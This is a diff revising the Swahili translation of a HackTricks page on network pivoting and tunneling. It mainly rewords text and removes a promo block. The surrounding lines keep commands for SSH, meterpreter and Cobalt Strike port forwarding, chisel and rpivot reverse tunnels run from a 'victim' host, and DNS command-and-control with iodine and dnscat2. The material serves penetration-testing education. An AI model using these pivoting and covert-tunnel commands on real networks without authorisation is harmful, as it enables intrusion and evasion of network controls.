@@ -15,18 +15,10 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 </details>
 {% endhint %}
 
-**Try Hard Security Group**
-
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
-***
-
 ## Nmap tip
 
 {% hint style="warning" %}
-**ICMP** na **SYN** skana haiwezi kupitishwa kupitia socks proxies, hivyo lazima **tuondoe ping discovery** (`-Pn`) na kubaini **TCP skana** (`-sT`) ili hii ifanye kazi.
+**ICMP** na **SYN** skani hazitaweza kupitishwa kupitia socks proxies, hivyo lazima **tuondoe ping discovery** (`-Pn`) na kubaini **TCP skani** (`-sT`) ili hii ifanye kazi.
 {% endhint %}
 
 ## **Bash**
@@ -55,7 +47,7 @@ ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
 ```
 ### Local Port2Port
 
-Fungua Bandari Mpya kwenye SSH Server --> Bandari nyingine
+Fungua Port mpya kwenye SSH Server --> Port nyingine
 ```bash
 ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
 ```
@@ -126,7 +118,7 @@ sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
 
 ### Port2Port
 
-Bandari ya ndani --> Kituo kilichoshambuliwa (sehemu inayofanya kazi) --> Sanduku\_tatu:Bandari
+Bandari ya ndani --> Kituo kilichoshambuliwa (kipindi kinachofanya kazi) --> Sanduku\_tatu:Bandari
 ```bash
 # Inside a meterpreter session
 portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
@@ -156,7 +148,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### SOCKS proxy
 
-Fungua bandari katika teamserver inayosikiliza kwenye interfaces zote ambazo zinaweza kutumika **kuelekeza trafiki kupitia beacon**.
+Fungua bandari katika server ya timu inayosikiliza katika interfaces zote ambazo zinaweza kutumika **kuelekeza trafiki kupitia beacon**.
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -167,7 +159,7 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ### rPort2Port
 
 {% hint style="warning" %}
-Katika kesi hii, **bandari imefunguliwa katika mwenyeji wa beacon**, sio katika Server ya Timu na trafiki inatumwa kwa Server ya Timu na kutoka hapo kwa mwenyeji:bandari iliyoonyeshwa.
+Katika kesi hii, **bandari imefunguliwa katika mwenyeji wa beacon**, sio katika Server ya Timu na trafiki inatumwa kwa Server ya Timu na kutoka hapo kwa mwenyeji:bandari iliyoonyeshwa
 {% endhint %}
 ```bash
 rportfwd [bind port] [forward host] [forward port]
@@ -175,14 +167,14 @@ rportfwd stop [bind port]
 ```
 To note:
 
-- Reverse port forward ya Beacon imeundwa ili **kufanya tunneling ya trafiki kwa Server ya Timu, sio kwa kuhamasisha kati ya mashine binafsi**.
-- Trafiki ni **tunneled ndani ya trafiki ya C2 ya Beacon**, ikiwa ni pamoja na viungo vya P2P.
+- Reverse port forward ya Beacon imeundwa ili **kufanya tunneling ya trafiki kwa Team Server, sio kwa kuhamasisha kati ya mashine binafsi**.
+- Trafiki **inafanywa tunneling ndani ya trafiki ya C2 ya Beacon**, ikiwa ni pamoja na viungo vya P2P.
 - **Haki za admin hazihitajiki** kuunda reverse port forwards kwenye port za juu.
 
 ### rPort2Port local
 
 {% hint style="warning" %}
-Katika kesi hii, **port imefunguliwa katika mwenyeji wa beacon**, sio katika Server ya Timu na **trafiki inatumwa kwa mteja wa Cobalt Strike** (sio kwa Server ya Timu) na kutoka hapo kwa mwenyeji:port iliyoonyeshwa.
+Katika kesi hii, **port imefunguliwa katika mwenyeji wa beacon**, sio katika Team Server na **trafiki inatumwa kwa mteja wa Cobalt Strike** (sio kwa Team Server) na kutoka hapo kwa mwenyeji:port iliyoonyeshwa.
 {% endhint %}
 ```
 rportfwd_local [bind port] [forward host] [forward port]
@@ -210,7 +202,7 @@ Unahitaji kutumia **toleo sawa kwa mteja na seva**
 ./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
 ./chisel client -v 10.10.10.10:8080 socks #Attacker
 ```
-### Uelekezaji wa bandari
+### Uhamasishaji wa bandari
 ```bash
 ./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
 ./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
@@ -219,7 +211,7 @@ Unahitaji kutumia **toleo sawa kwa mteja na seva**
 
 [https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)
 
-Tunneli ya kurudi. Tunneli inaanza kutoka kwa mwathirika.\
+Tunneli ya nyuma. Tunneli inaanza kutoka kwa mwathirika.\
 Proxy ya socks4 inaundwa kwenye 127.0.0.1:1080
 ```bash
 attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
@@ -325,13 +317,13 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 ```
 ## SocksOverRDP & Proxifier
 
-Unahitaji kuwa na **RDP access juu ya mfumo**.\
+Unahitaji kuwa na **ufikiaji wa RDP juu ya mfumo**.\
 Pakua:
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Chombo hiki kinatumia `Dynamic Virtual Channels` (`DVC`) kutoka kwa kipengele cha Remote Desktop Service cha Windows. DVC inawajibika kwa **tunneling packets juu ya RDP connection**.
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Chombo hiki kinatumia `Dynamic Virtual Channels` (`DVC`) kutoka kwa kipengele cha Huduma ya Desktop ya KijRemote ya Windows. DVC inawajibika kwa **kuchora pakiti juu ya muunganisho wa RDP**.
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
-Katika kompyuta yako ya mteja pakia **`SocksOverRDP-Plugin.dll`** kama ifuatavyo:
+Katika kompyuta yako ya mteja, pakia **`SocksOverRDP-Plugin.dll`** kama ifuatavyo:
 ```bash
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
@@ -346,13 +338,13 @@ Sasa, thibitisha kwenye mashine yako (mshambuliaji) kwamba bandari 1080 inasikil
 ```
 netstat -antb | findstr 1080
 ```
-Sasa unaweza kutumia [**Proxifier**](https://www.proxifier.com/) **kupanua trafiki kupitia bandari hiyo.**
+Sasa unaweza kutumia [**Proxifier**](https://www.proxifier.com/) **kupeleka trafiki kupitia bandari hiyo.**
 
 ## Proxify Windows GUI Apps
 
 Unaweza kufanya programu za Windows GUI zipitie proxy kwa kutumia [**Proxifier**](https://www.proxifier.com/).\
 Katika **Profile -> Proxy Servers** ongeza IP na bandari ya seva ya SOCKS.\
-Katika **Profile -> Proxification Rules** ongeza jina la programu ya kupanua na muunganisho kwa IP unazotaka kupanua.
+Katika **Profile -> Proxification Rules** ongeza jina la programu ya kupeleka na muunganisho kwa IP unazotaka kupeleka.
 
 ## NTLM proxy bypass
 
@@ -365,8 +357,8 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-Inathibitisha dhidi ya proxy na inafunga bandari kwa ndani ambayo inasambazwa kwa huduma ya nje unayoelekeza. Kisha, unaweza kutumia chombo chochote unachokipenda kupitia bandari hii.\
-Kwa mfano, inasambaza bandari 443
+Inathibitisha dhidi ya proxy na inafunga bandari kwa ndani ambayo inapelekwa kwa huduma ya nje unayoelekeza. Kisha, unaweza kutumia chombo chochote unachokipenda kupitia bandari hii.\
+Kwa mfano, inapeleka bandari 443
 ```
 Username Alice
 Password P@ssw0rd
@@ -393,7 +385,7 @@ attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
 #You can see the victim at 1.1.1.2
 ```
-Tuneli itakuwa polepole sana. Unaweza kuunda muunganisho wa SSH uliofinywa kupitia tuneli hii kwa kutumia:
+Tuneli itakuwa polepole sana. Unaweza kuunda muunganisho wa SSH ulioshinikizwa kupitia tuneli hii kwa kutumia:
 ```
 ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
 ```
@@ -401,7 +393,7 @@ ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
 
 [**Pakua kutoka hapa**](https://github.com/iagox86/dnscat2)**.**
 
-Inaunda channel ya C\&C kupitia DNS. Haitaji ruhusa za mzizi.
+Inaunda channel ya C\&C kupitia DNS. Haihitaji ruhusa za root.
 ```bash
 attacker> ruby ./dnscat2.rb tunneldomain.com
 victim> ./dnscat2 tunneldomain.com
@@ -474,13 +466,13 @@ chmod a+x ./ngrok
 # Init configuration, with your token
 ./ngrok config edit
 ```
-### Matumizi Msingi
+### Matumizi ya Msingi
 
 **Hati:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).
 
 *Pia inawezekana kuongeza uthibitisho na TLS, ikiwa ni lazima.*
 
-#### Tunneling TCP
+#### Kuingiza TCP
 ```bash
 # Pointing to 0.0.0.0:4444
 ./ngrok tcp 4444
@@ -507,9 +499,9 @@ Moja kwa moja kutoka stdout au katika kiolesura cha HTTP [http://127.0.0.1:4040]
 ```
 #### ngrok.yaml mfano rahisi wa usanidi
 
-Inafungua miji 3:
+Inafungua mabwawa 3:
 - 2 TCP
-- 1 HTTP na uwasilishaji wa faili za kudumu kutoka /tmp/httpbin/
+- 1 HTTP na uonyeshaji wa faili za kudumu kutoka /tmp/httpbin/
 ```yaml
 tunnels:
 mytcp:
@@ -522,22 +514,14 @@ httpstatic:
 proto: http
 addr: file:///tmp/httpbin/
 ```
-## Zana nyingine za kuangalia
+## Vifaa vingine vya kuangalia
 
 * [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
 * [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)
 
-**Jaribu Kikundi cha Usalama wa Juu**
-
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
-***
-
 {% hint style="success" %}
-Jifunze & fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Jifunze & fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Jifunze na fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Jifunze na fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
